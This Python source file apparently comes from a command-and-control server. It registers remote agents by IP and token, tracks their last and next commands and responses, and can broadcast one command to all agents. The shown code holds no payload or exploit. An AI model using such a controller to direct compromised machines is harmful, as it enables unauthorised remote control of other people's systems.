from tabulate import tabulate
from queue import Queue
from agent import Agent


class Command:
    def __init__(self):
        self._database = {}
        self._current_id = 1
        self._queue = Queue()

    def add_notification(self, msg):
        self._queue.put(msg)

    def get_notification(self):
        if self._queue.qsize():
            return self._queue.get()
        return ""

    def signup_agent(self, agent):
        if not isinstance(agent, Agent):
            raise TypeError("Expected an object of type Member")
        self._database[self._current_id] = agent
        self._current_id += 1
        return self._current_id - 1

    def get_current_status(self):
        rows = []
        for key, agent in self._database.items():
            rows.append(
                [
                    key,
                    agent.ip,
                    agent.token,
                    agent.last_communication,
                    agent.next_command,
                    agent.last_response,
                    agent.last_command,
                ]
            )

        return tabulate(
            rows,
            headers=[
                "Session",
                "IP",
                "token",
                "Last-Comm",
                "Next-Command",
                "Last-Response",
                "Last-Command",
            ],
            tablefmt="fancy_grid",
            stralign="left",
        )

    def get_agent_by_session_id(self, session_id):
        return self._database.get(session_id)

    def send_broadcast_command(self, command):
        for agent in self._database.values():
            agent.next_command = command

    def get_agent_by_token(self, token):
        for key, agent in self._database.items():
            if agent.token == token:
                return key, agent

        return None
